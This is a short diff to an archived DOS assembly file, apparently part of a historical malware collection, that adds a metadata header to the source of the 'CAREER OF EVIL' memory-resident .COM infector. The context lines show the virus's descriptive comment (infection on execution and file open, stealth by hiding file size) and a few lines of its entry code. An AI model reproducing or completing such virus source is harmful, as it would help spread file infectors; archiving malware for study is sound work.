@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      C
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;CAREER OF EVIL virus:  a simple memory resident .COMinfector
 ;which infects on execution and file open.  CAREER OF EVIL also
 ;has limited stealth, subtracting its file size from infected files
@@ -22,7 +33,7 @@
 
 begin:         call    virus       ;
 
-host           db   '� RottenUK'   ; dummy place-holder where   
+host           db   '� RottenUK'   ; dummy place-holder where   
 				   ; virus stashes original 5-bytes
 				   ; from host file
 db             'Career of Evil',0
